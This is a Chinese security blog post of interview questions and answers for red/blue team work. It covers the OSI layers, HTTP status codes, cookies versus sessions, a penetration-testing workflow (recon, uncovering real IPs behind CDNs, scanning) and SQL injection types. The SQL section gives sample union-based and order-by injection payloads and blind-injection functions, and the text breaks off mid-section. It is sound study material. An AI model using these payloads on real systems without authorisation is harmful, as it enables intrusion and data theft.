<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>护网面试问题 | Y5neKO's Blog</title><meta name="author" content="Y5neKO"><meta name="copyright" content="Y5neKO"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一些有关hvv的面试问题及解答。">
<meta property="og:type" content="article">
<meta property="og:title" content="护网面试问题">
<meta property="og:url" content="https://y5neko.github.com/2022/10/21/%E6%8A%A4%E7%BD%91%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98/index.html">
<meta property="og:site_name" content="Y5neKO&#39;s Blog">
<meta property="og:description" content="一些有关hvv的面试问题及解答。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://y5neko.github.com/image/image-20220604141005170.png">
<meta property="article:published_time" content="2022-10-20T16:00:00.000Z">
<meta property="article:modified_time" content="2023-11-27T06:58:33.638Z">
<meta property="article:author" content="Y5neKO">
<meta property="article:tag" content="笔记">
<meta property="article:tag" content="hvv">
<meta property="article:tag" content="面经">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://y5neko.github.com/image/image-20220604141005170.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://y5neko.github.com/2022/10/21/%E6%8A%A4%E7%BD%91%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d4f6675f179ef53324ef6281fc51a93c";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: {"limitDay":1000,"position":"top","messagePrev":"这篇文章最后更新时间是","messageNext":"天之前，描述可能已经失效，请谨慎辨别."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: Y5neKO","link":"链接: ","source":"来源: Y5neKO's Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体中文","cht_to_chs":"你已切换为简体中文","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: true,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '护网面试问题',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-11-27 14:58:33'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 6 || hour >= 18
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body><script>window.paceOptions = {
  restartOnPushState: false
}

document.addEventListener('pjax:send', () => {
  Pace.restart()
})
</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://q1.qlogo.cn/g?b=qq&amp;nk=1727058834&amp;s=640" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 项目</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/image/image-20220604141005170.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Y5neKO's Blog"><span class="site-name">Y5neKO's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 项目</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">护网面试问题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-20T16:00:00.000Z" title="发表于 2022-10-21 00:00:00">2022-10-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-27T06:58:33.638Z" title="更新于 2023-11-27 14:58:33">2023-11-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%A2%E7%BB%8F/">面经</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">15.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>54分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="护网面试问题"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2022/10/21/%E6%8A%A4%E7%BD%91%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98/#post-comment"><span class="gitalk-comment-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="osi七层模型"><a href="#osi七层模型" class="headerlink" title="osi七层模型"></a>osi七层模型</h2><h3 id="第七层-应用层"><a href="#第七层-应用层" class="headerlink" title="第七层:应用层"></a>第七层:应用层</h3><p>功能:提供各种各样的应用层协议,为用户与网络之间提供一个打交道的接口。<br>常见协议:TELENT,DNS,HTTP,HTTPS,FTP,NFS<br>协议介绍:<br>TELENT:使用远程计算机上所拥有的本地计算机没有的信息资源，是常用的远程控制Web服务器的方法<br>DNS(域名解析协议):将域名解析为IP地址<br>HTTP(超文本传输协议):规定web服务端和客户端的数据传输格式<br>HTTPS(超文本传输安全协议):是HTTP加上TLS&#x2F;SSL协议构成的可加密传输的网络协议<br>FTP(文件传输协议):网络共享文件传输<br>NFS(网络文件系统):用户和程序可以像访问本地文件一样访问远端系统上的文件。</p>
<h3 id="第六层-表示层"><a href="#第六层-表示层" class="headerlink" title="第六层:表示层"></a>第六层:表示层</h3><p>功能:提供应用层数据的公共表示,即统一数据格式,从而使得数据能在两个系统中传输。<br>常见协议:LPP<br>协议介绍:<br>LPP(轻量级会话协议):描述了在某些受限条件下提供基于 TCP&#x2F;IP 网络的 OSI 应用程序服务器的流线支持的方法。</p>
<h3 id="第五层-会话层"><a href="#第五层-会话层" class="headerlink" title="第五层:会话层"></a>第五层:会话层</h3><p>功能:负责应用程序之间建立、维持和中断会话，同时也提供对设备和结点之间的会话控制，协调系统和服务之间的交流，并通过提供单工、半双工和全双工3种不同的通信方式，使系统和服务之间有序地进行通信。<br>常见协议:LDAP<br>协议介绍:<br>LDAP(轻型目录访问协议):通过IP协议提供访问控制和维护分布式信息的目录信息</p>
<h3 id="第四层-传输层"><a href="#第四层-传输层" class="headerlink" title="第四层:传输层"></a>第四层:传输层</h3><p>功能:主要功能负责数据传输时端到端的完整性，即在网络上建立发送主机和目的主机之间的逻辑连接，从而隐藏了上一层提供数据传输时任何网络独立信息。<br>常见协议:TCP,UDP,TLS<br>协议介绍:<br>TCP(传输控制协议):一种面向连接的、可靠的、基于字节流的传输层通信协议<br>UDP(用户数据报协议):面向事务的简单不可靠信息传送服务<br>TLS(传输层安全协议):在两个通信应用程序之间提供保密性和数据完整性</p>
<h3 id="第三层-网络层"><a href="#第三层-网络层" class="headerlink" title="第三层:网络层"></a>第三层:网络层</h3><p>功能:负责数据从一个结点到另一个结点的传输，并根据地址（IP&#x2F;IPX地址），为信息在网络中传输是选择最佳路径。<br>常见协议:IP,ICMP,ICMPv6,ARP,RARP<br>协议介绍:<br>IP(网络互联协议):为主机提供一种无连接、不可靠的、尽力而为的数据包传输服务<br>ICMP(Internet控制报文协议):是一种面向无连接的协议，用于传输出错报告控制信息<br>ICMPv6(互联网控制信息协议版本六):为了与IPv6配套使用而开发的互联网控制信息协议,向源节点报告关于目的地址传输IPv6包的错误和信息，具有差错报告、网络诊断、邻节点发现和多播实现等功能<br>ARP(地址解析协议):据IP地址获取物理地址的一个TCP&#x2F;IP协议<br>RARP(反向地址转换协议):发出要反向解析的物理地址并希望返回其对应的IP地址，应答包括由能够提供所需信息的RARP服务器发出的IP地址</p>
<p>设备：路由器</p>
<h3 id="第二层-数据链路层"><a href="#第二层-数据链路层" class="headerlink" title="第二层:数据链路层"></a>第二层:数据链路层</h3><p>功能:主要功能是负责信息从一个结点到另一人结点的物理传输，检测在物理层上传输可能发生的错误并进行纠错，同时处理网络拓扑结构和流量控制等问题。<br>常见协议:VLAN,STP,IEEE 802.3,WIFI(IEEE 802.11),ATM,HDLC,PPP<br>协议介绍:<br>VLAN(虚拟局域网):根据功能、部门及应用等因素将设备或用户组织起来，相互之间的通信就好像它们在同一个网段中一样<br>STP(生成树协议):应用于计算机网络中树形拓扑结构建立，主要作用是防止网桥网络中的冗余链路形成环路工作<br>IEEE 802.3:定义了有线以太网的物理层和数据链路层的介质访问控制 （MAC）<br>WIFI(无线通信技术):实现无线上网<br>ATM(异步传输网):用户平面——是用户协议之间的接口如IP或SMDS和ATM等协议的接口互相协调;管理平面——使ATM栈的各层互相协调;控制平面——使信令传送以及虚电路的建立和拆除互相协调。<br>HDLC(高级数据链路控制):帧控制,帧同步,差错控制,流量控制,链路管理,透明传输,寻址,异常状态恢复<br>PPP(点对点协议):用来通过拨号或专线方式建立点对点连接发送数据，使其成为各种主机、网桥和路由器之间简单连接的一种共通的解决方案</p>
<p>设备：网桥，交换机</p>
<h3 id="第一层-物理层"><a href="#第一层-物理层" class="headerlink" title="第一层:物理层"></a>第一层:物理层</h3><p>功能:主要功能是直接在物理传输介质上发送和接收数据位，为数据链路层提供物理连接。</p>
<p>设备：网卡，网线，集线器，中继器，调制解调器</p>
<h2 id="常见的状态码"><a href="#常见的状态码" class="headerlink" title="常见的状态码"></a>常见的状态码</h2><p> <strong>2XX——表明请求被正常处理了</strong></p>
<p>1、200 OK：请求已正常处理。</p>
<p>2、204 No Content：请求处理成功，但没有任何资源可以返回给客户端，一般在只需要从客户端往服务器发送信息，而对客户端不需要发送新信息内容的情况下使用。</p>
<p>3、206 Partial Content：是对资源某一部分的请求，该状态码表示客户端进行了范围请求，而服务器成功执行了这部分的GET请求。响应报文中包含由Content-Range指定范围的实体内容。</p>
<p><strong>3XX——表明浏览器需要执行某些特殊的处理以正确处理请求</strong></p>
<p>4、301 Moved Permanently：资源的uri已更新，你也更新下你的书签引用吧。永久性重定向，请求的资源已经被分配了新的URI，以后应使用资源现在所指的URI。</p>
<p>5、302 Found：资源的URI已临时定位到其他位置了，姑且算你已经知道了这个情况了。临时性重定向。和301相似，但302代表的资源不是永久性移动，只是临时性性质的。换句话说，已移动的资源对应的URI将来还有可能发生改变。</p>
<p>6、303 See Other：资源的URI已更新，你是否能临时按新的URI访问。该状态码表示由于请求对应的资源存在着另一个URL，应使用GET方法定向获取请求的资源。303状态码和302状态码有着相同的功能，但303状态码明确表示客户端应当采用GET方法获取资源，这点与302状态码有区别。</p>
<p>当301,302,303响应状态码返回时，几乎所有的浏览器都会把POST改成GET，并删除请求报文内的主体，之后请求会自动再次发送。</p>
<p>7、304 Not Modified：资源已找到，但未符合条件请求。该状态码表示客户端发送附带条件的请求时（采用GET方法的请求报文中包含If-Match，If-Modified-Since，If-None-Match，If-Range，If-Unmodified-Since中任一首部）服务端允许请求访问资源，但因发生请求未满足条件的情况后，直接返回304.。</p>
<p>8、307 Temporary Redirect：临时重定向。与302有相同的含义。</p>
<p><strong>4XX——表明客户端是发生错误的原因所在</strong></p>
<p>9、400 Bad Request：服务器端无法理解客户端发送的请求，请求报文中可能存在语法错误。</p>
<p>10、401 Unauthorized：该状态码表示发送的请求需要有通过HTTP认证（BASIC认证，DIGEST认证）的认证信息。</p>
<p>11、403 Forbidden：不允许访问那个资源。该状态码表明对请求资源的访问被服务器拒绝了。（权限，未授权IP等）</p>
<p>12、404 Not Found：服务器上没有请求的资源。路径错误等。</p>
<p><strong>5XX——服务器本身发生错误</strong></p>
<p>13、500 Internal Server Error：貌似内部资源出故障了。该状态码表明服务器端在执行请求时发生了错误。也有可能是web应用存在bug或某些临时故障。</p>
<p>14、503 Service Unavailable：抱歉，我现在正在忙着。该状态码表明服务器暂时处于超负载或正在停机维护，现在无法处理请求。</p>
<h2 id="session和cookie的区别"><a href="#session和cookie的区别" class="headerlink" title="session和cookie的区别"></a>session和cookie的区别</h2><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>cookie是一种无状态的协议</p>
<p>原理：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/image-20220602191657566.png" alt="image-20220602191657566"></p>
<p>相当于给客户端分发了一个id卡，第一次登录获取，第二次服务端通过客户端携带的id卡来确认身份，即优缺点非常明显：</p>
<p>优点：流程简单快速</p>
<p>缺点：容易遭到篡改；大小受到限制，一般为4kb</p>
<h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><p>session功能和cookie类似，不过有一定区别</p>
<p>原理：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/image-20220602191623108.png" alt="image-20220602191623108"></p>
<p>session顾名思义，即会话，是一种特殊的cookie。客户端访问服务端后，将状态以session的形式保存在服务端，此时再将该会话的id卡分发到客户端，再次访问服务端时，只需要从该session中查找该客户端的状态即可。</p>
<p>优点：更加安全</p>
<p>缺点：更占用服务器性能</p>
<h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><p>故区别有：cookie是保存在客户端，session保存在服务端</p>
<h2 id="渗透测试的流程和思路（外网打点等）"><a href="#渗透测试的流程和思路（外网打点等）" class="headerlink" title="渗透测试的流程和思路（外网打点等）"></a>渗透测试的流程和思路（外网打点等）</h2><h3 id="明确目标"><a href="#明确目标" class="headerlink" title="明确目标"></a>明确目标</h3><p>确认测试范围，如ip段，域名，站点等；对渗透目标进行判断，能进行渗透的程度。</p>
<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><ul>
<li>主动式信息搜集：得到的信息比较及时，获取到的信息更多，但容易被目标发现</li>
</ul>
<p>通过直接发起连接的方式来搜集目标信息，如各种扫描器（nmap等）进行扫描、手动测试等</p>
<ul>
<li>被动式信息搜集：搜集到的信息可能会有一定延时，获取到的信息较少，但更加隐蔽</li>
</ul>
<p>如果有外网，可搜索引擎关键词或语法搜索（<code>inurl=</code>等）、zoomeye等网络资产测绘引擎等，查找资产暴露面</p>
<h4 id="whois信息"><a href="#whois信息" class="headerlink" title="whois信息"></a>whois信息</h4><p>获取域名所有者的信息，包括姓名，公司，邮箱等，可以反查旁站、用于社会工程学的利用等。</p>
<h4 id="域名解析搜集"><a href="#域名解析搜集" class="headerlink" title="域名解析搜集"></a>域名解析搜集</h4><p>如果目标使用了cdn或其他方式隐藏了真实ip，可以尝试通过查找历史解析，旁站或子域名解析等方法来查找真实ip</p>
<h4 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h4><p>很多情况下，子域名可能和主站是相同服务器，如果主站没有发现突破口或者渗透难度较大，可尝试收集子域名，或从旁站寻找漏洞突破口</p>
<h4 id="真实ip获取"><a href="#真实ip获取" class="headerlink" title="真实ip获取"></a>真实ip获取</h4><p>首先判断目标是否采用了cdn</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.多地ping：因为cdn的目的是为了稳定速度，有些cdn服务商可能会在不同的地点或者ip设立节点服务器，所以不同地点ping出的ip不同则采用了cdn；但是多地ping出的ip相同也不一定就是真实ip，还要考虑单一cdn节点的可能性。</span><br><span class="line"></span><br><span class="line">2.二级域名：因为cdn流量还是比较贵的，所以不一定每个子域名都挂上了cdn，此时我们可以通过子域名来发现真实ip本地将目标域名绑定到同IP（修改host文件），如果能访问就说明目标站与此二级域名在同一个服务器上；如果两者不在同一服务器也可能在同C段，扫描C段所有开80端口的IP，然后挨个尝试。</span><br><span class="line"></span><br><span class="line">3.国外冷门dns服务器解析：大部分国内cdn服务商只针对国内市场，如果采用外国冷门服务器进行dns解析，有较大概率解析到真实ip</span><br></pre></td></tr></table></figure>

<h4 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h4><p>通常情况下，建站者为了方便，会直接采用常见的CMS、框架或者中间件等，比较常见的建站系统都会有明显的指纹特征，网上公开的漏洞或者源码也会比较多，通过相应指纹识别，可以一定程度上帮助渗透过程</p>
<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p>nmap，masscan等进行扫描目标开放端口以及获取端口banner，确定端口对应的服务以及版本</p>
<h4 id="旁站c段查询"><a href="#旁站c段查询" class="headerlink" title="旁站c段查询"></a>旁站c段查询</h4><p>通过入侵安全性较差的旁站，c段（测试站点），可通过提权、跨目录等手段拿到目标服务器的权限</p>
<p><strong>httpscan：通过爬虫的方式扫描指定c段的网站信息</strong></p>
<h3 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h3><h4 id="前端信息泄露"><a href="#前端信息泄露" class="headerlink" title="前端信息泄露"></a>前端信息泄露</h4><p>一些前端的静态文件（静态文件目录，js，css等）和静态接口，可能泄露敏感数据</p>
<h4 id="敏感目录扫描，备份文件等"><a href="#敏感目录扫描，备份文件等" class="headerlink" title="敏感目录扫描，备份文件等"></a>敏感目录扫描，备份文件等</h4><p>通过手动fuzz或者扫描器扫描，搜集目标站点的敏感目录或者备份文件等等。不一定要能够访问，也可以从前端或者报错的信息来判断</p>
<h4 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h4><p>前台或后台登陆点可能存在弱口令</p>
<h4 id="注册点"><a href="#注册点" class="headerlink" title="注册点"></a>注册点</h4><p>注册点一般是比较敏感的，如果开放了注册功能，可能拿到一些普通的用户权限</p>
<h4 id="上传点"><a href="#上传点" class="headerlink" title="上传点"></a>上传点</h4><p>常见的上传点有：头像上传，文章图片上传，富文本编辑器等</p>
<h4 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h4><p>网站未对输入的字符进行过滤或者合法性校验，可通过拼接，拦截，绕过黑名单等方式来执行恶意命令</p>
<h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>网站进行sql查询的点，如果未对传入的数据进行过滤，可猜测和拼接sql查询语句来执行恶意查询</p>
<h4 id="已知组件CVE或存在exp的漏洞"><a href="#已知组件CVE或存在exp的漏洞" class="headerlink" title="已知组件CVE或存在exp的漏洞"></a>已知组件CVE或存在exp的漏洞</h4><p>通过指纹识别获取到的目标组件、版本信息</p>
<h3 id="后续渗透"><a href="#后续渗透" class="headerlink" title="后续渗透"></a>后续渗透</h3><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>通过漏洞探测到的可用漏洞进行进一步操作，例如webshell等</p>
<h2 id="sql注入的方式"><a href="#sql注入的方式" class="headerlink" title="sql注入的方式"></a>sql注入的方式</h2><h3 id="按注入类型"><a href="#按注入类型" class="headerlink" title="按注入类型"></a>按注入类型</h3><ul>
<li>数字型</li>
<li>字符型（输入型）</li>
</ul>
<p>判断：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 order by 9999 --+		#正常返回则为字符型，报错则为数字型</span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>假设语句为</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id <span class="operator">=</span> $id;</span><br></pre></td></tr></table></figure>

<p>字符型中，注释内容会被当作id的一部分（字符串），在执行sql语句的过程中只会取前面的1，所以会正常执行</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/image-20221019153748911.png" alt="image-20221019153748911" style="zoom:80%;" />

<p>而在数字型中，后面的order by会被当做排序语句执行，而正常数据库中不会有9999个字段，所以会报错</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/image-20221019154129333.png" alt="image-20221019154129333" style="zoom:80%;" />





<h3 id="按数据提交方式"><a href="#按数据提交方式" class="headerlink" title="按数据提交方式"></a>按数据提交方式</h3><ul>
<li>GET</li>
<li>POST</li>
<li>HTTP头部（XXF，cookie等）</li>
</ul>
<h3 id="按执行效果"><a href="#按执行效果" class="headerlink" title="按执行效果"></a>按执行效果</h3><ul>
<li>基于报错的注入：有报错或其他回显</li>
</ul>
<p>能将攻击者想要查询的信息（数据库名，版本号等）通过页面的错误提示回显；</p>
<p>前提条件：数据库未关闭报错函数，后台未对具有报错功能的函数进行过滤</p>
<p>常用的报错函数：extractvalue()、updatexml()、floor()、exp()等</p>
<p>一般步骤：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 1#								#判断字段数</span><br><span class="line">1&#x27; union select 1,2,3#						#判断字段的位置</span><br><span class="line">1&#x27; union select 1,2,database()#				#爆数据库名，*要查询的信息最好在每一个位置上都试试*</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<ul>
<li>基于布尔的盲注：根据返回页面执行是否正确来判断是否成功</li>
</ul>
<p>不会直接显示查询的内容，只会返回查询是否成功；布尔运算是数字符号化的逻辑推演法，包括联合、相交、相减。在图形处理操作中引入了这种逻辑运算方法以使简单的基本图形组合产生新的形体（说人话：可以从字符的挨个比较来得出想要的信息）</p>
<p>重要函数：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">count()										<span class="comment">#计算结果集的行数</span></span><br><span class="line">length(str)									<span class="comment">#返回指定字符串的长度</span></span><br><span class="line">substr/substring(str, index, length)		<span class="comment">#返回截取的子字符串</span></span><br><span class="line">ascii(str)									<span class="comment">#返回指定字符串最左侧字符的ascii值</span></span><br></pre></td></tr></table></figure>

<p>一般步骤：</p>
